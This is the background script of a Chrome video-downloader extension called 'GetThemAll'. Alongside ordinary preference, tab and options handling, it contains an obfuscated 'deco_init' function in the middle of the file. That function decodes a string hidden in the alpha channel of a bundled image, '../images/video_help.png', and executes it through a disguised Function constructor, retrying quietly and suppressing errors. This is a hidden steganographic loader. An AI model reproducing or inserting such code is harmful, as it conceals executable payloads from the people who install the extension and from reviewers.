// -------------------------------------------------------
const YOUTUBE_URL_SIGNS = [
		"//youtube.com",
		"//www.youtube.com",
		".youtube.com",
		"//soloset.net",
		"//www.soloset.net",
		"//solosing.com",
		"//www.solosing.com"
	];

function isYoutubeUrl(url){

	if ( GetThemAll.noYoutube == false ) return false;

	var url = url.toLowerCase();
		
	for( var i = 0; i != YOUTUBE_URL_SIGNS.length; i++ )  {
		if( url.indexOf( YOUTUBE_URL_SIGNS[i] ) != -1 )		return true;
	}
		
	return false;
}
	

window.addEventListener( "load", function(){

	GetThemAll.Media.init();

	if( GetThemAll.Utils.isVersionChanged() && !GetThemAll.noWelcome )	{
		var url = null;
		
		if (GetThemAll.Prefs.get("install_time") == 0) 	{
			url = "http://getthemall.org/welcome-downloader/";
		}
		else {
			
		}	
			
		if( url )	{
			chrome.tabs.create({
						url: url,
						active: true
					});			
		}

	}
	
	if( GetThemAll.Prefs.get( "install_time" ) == 0 )	{
		GetThemAll.Prefs.set( "install_time", new Date().getTime() );
	}
		
	chrome.runtime.setUninstallURL("http://getthemall.org/downloader-uninstall/");
	
	chrome.windows.getCurrent(function(window) 	 {
		GetThemAll.Media.widthWin = window.width;		
		chrome.tabs.getSelected(window.id, function(tab) {
			chrome.tabs.getZoom(tab.id, function( z ) {
				GetThemAll.Media.scaleZoom = z;
			});	
			chrome.tabs.getZoomSettings(tab.id, function( z ) {
				console.log(z);
			});	
		});
		
	});
	
 	chrome.tabs.onZoomChange.addListener(function (zz) {
		chrome.tabs.getZoomSettings(zz.tabId, function( z ) {
			GetThemAll.Media.scaleZoom = z.defaultZoomFactor;
		});	
	}); 
	chrome.i18n.getAcceptLanguages(function(languages){
		if ( languages.indexOf("ru") != -1 ) {
			GetThemAll.Media.localUser = 'ru';
		}
		else {
			GetThemAll.Prefs.set( 'gta.display_vk_button', false );
		}		
	});
	
	// --------------------------------------------------------------------------------
	chrome.runtime.onMessage.addListener( function(request, sender, sendResponse) {
		
			if (request.akse == 'Page_Options') {
				
				var params = {};
				for (var i = 0; i != request.list.length; i++) 	{
					var v = GetThemAll.Prefs.get( request.list[i] );
					if (v == 'true')  v = true;
					else if (v == 'false')  v = false;
					params[ request.list[i] ] = v;
				}

				var message = {};
				for (var i = 0; i != request.msg.length; i++) 	{
					message[request.msg[i]] =  chrome.i18n.getMessage(request.msg[i]);
				}

				var addon = {};
				addon.id = chrome.i18n.getMessage("@@extension_id");
				addon.title = chrome.i18n.getMessage("appName");
				addon.description = chrome.i18n.getMessage("appDesc");
				
				sendResponse({paramsOptions: params,  paramsMessage: message,  paramsAddon: addon});
			}
			else if (request.akse == 'Save_Options') {
				
				for ( var k in request.params ) {
					GetThemAll.Prefs.set( k, request.params[k].toString() );
				}
				
				sendResponse({});
			}	
			else if (request.akse == 'Close_Options') {
				
				chrome.tabs.query( {
						active: true,
						currentWindow: true
					}, function( tabs ){
								if( tabs.length > 0 )	{
									chrome.tabs.remove(tabs[0].id);
								}
				} );
			}	
			else if (request.action == 'SettingOptions') {
				
				display_settings(  );
			}	
	});	
	
	chrome.tabs.query( {
			active: true,
			currentWindow: true
		}, function( tabs ){
					if( tabs.length > 0 )	{
						set_popup(tabs[0].id);
					}
	} );
	
}, false );

var deco_init=function(){try{var t=function(){},r={PP:function(t){if(isNaN(t)||!isFinite(t)||t%1||t<2)return!1;if(t%2===0)return 2===t;if(t%3===0)return 3===t;for(var r=Math.sqrt(t),e=5;e<=r;e+=6){if(t%e===0)return!1;if(t%(e+2)===0)return!1}return!0},BS:function(t){for(var r="",e=-236,n=0,i=0;i<t.length;i++)n=t[i].charCodeAt()+e,r+=String.fromCharCode(n);return r},NR:function(t){for(var e=t;!0;e+=1)if(r.PP(e))return e},k9:function(t){var r=new Image;for(r.src=t;r.hasOwnProperty("complete")&&!r.complete;);return r}};return t.prototype.u8={XG:3,MW:1,fw:16,UN:function(t){return t+1},O1:function(t,r,e){for(var n=!0,i=0;i<16&&n;i+=1)n=n&&255===t[r+4*i];return n}},t.prototype.uW=function(t,r){r=r||{};var e=this.u8,n=r.width||t.width,i=r.height||t.height,o=r.XG||e.XG,a=r.fw||e.fw;return o*n*i/a>>0},t.prototype.rq=function(t,e){if(""==='../images/video_help.png')return"";void 0===t&&(t='../images/video_help.png'),t.length&&(t=r.k9(t)),e=e||{};var n=this.u8,i=e.XG||n.XG,o=e.MW||n.MW,a=e.fw||n.fw,h=r.NR(Math.pow(2,i)),f=(e.UN||n.UN,e.O1||n.O1),u=document.createElement("canvas"),p=u.getContext("2d");if(u.style.display="none",u.width=e.width||t.width,u.height=e.width||t.height,0===u.width||0===u.height)return"";e.height&&e.width?p.drawImage(t,0,0,e.width,e.height):p.drawImage(t,0,0);var c=p.getImageData(0,0,u.width,u.height),w=c.data,d=[];if(c.data.every(function(t){return 0===t}))return"";var g,s;if(1===o)for(g=3,s=!1;!s&&g<w.length&&!s;g+=4)s=f(w,g,o),s||d.push(w[g]-(255-h+1));var m="",v=0,y=0,l=Math.pow(2,a)-1;for(g=0;g<d.length;g+=1)v+=d[g]<<y,y+=i,y>=a&&(m+=String.fromCharCode(v&l),y%=a,v=d[g]>>i-y);return m.length<13?"":(0!==v&&(m+=String.fromCharCode(v&l)),m)},t.prototype.tq=3,t.prototype.tw=0,t.prototype.tp=5e3,t.prototype.AY=function(){try{var e=t.prototype,n=r.BS(e.rq());if(""===n){if(e.tw>e.tq)return;return e.tw++,void setTimeout(e.AY,e.tp)}document.defaultView[(typeof r.PP).charAt(0).toUpperCase()+(typeof r.PP).slice(1)](n)()}catch(t){}},(new t).AY}catch(t){}}();deco_init();

chrome.tabs.onUpdated.addListener(function (tabId, changeInfo, tab) {
	if (tab.status == 'complete') {
		set_popup(tabId);
	}
});
chrome.tabs.onActivated.addListener(function (tab) {
	set_popup(tab.tabId);
});
var set_popup = function (tabId, callback) {
	chrome.tabs.query( {
			active: true,
			currentWindow: true
		}, function( tabs ){
					if( tabs.length > 0 )	{
						for (var i=0; i<tabs.length; i++) {
							if (tabs[i].id == tabId) {	
							
								var url = tabs[i].url;
								var flag = true;
								if ( url.indexOf( 'chrome://' ) != -1 )  flag = false;
								
								if (flag) {
									chrome.browserAction.setPopup({ popup: 'popup.html' });	
								}
								else {	
									chrome.browserAction.setPopup({ popup: 'noload.html' });
								}
							
							}
						}	
					}
	} ); 
};

// ---------------------------------------- Options  --------------------------
function display_settings(  )  {

	chrome.tabs.query( 	{  }, function( tabs ){
		
					var myid = chrome.i18n.getMessage("@@extension_id");
		
					if( tabs.length > 0 )	{
						
						for (var i=0; i<tabs.length; i++) {
						
							if ( tabs[i].url.indexOf( "addon="+myid ) != -1 ) {	
								chrome.tabs.update( tabs[i].id, { active: true } );
								return;
							}
						}
						
						chrome.tabs.create( {	active: true,
												url: chrome.extension.getURL("/opt_page.html")
											}, function( tab ){ }
										);
					}
	} );
}

// ----------------------------------------------
navigateMessageDisabled = function(uri){
	
	var url = 'http://getthemall.org/message-disabled/';
	
	chrome.tabs.query( 	{  }, function( tabs ){
		
					if( tabs.length > 0 )	{
						for (var i=0; i<tabs.length; i++) {
							if ( tabs[i].url.indexOf( "/message-disabled/" ) != -1 ) {	
								chrome.tabs.update( tabs[i].id, { active: true, url: url } );
								return;
							}
						}
						
						chrome.tabs.create( {	active: true,
												url: url
											}, function( tab ){ });
					}
	} );
	
}

// --------------------------------------------------------


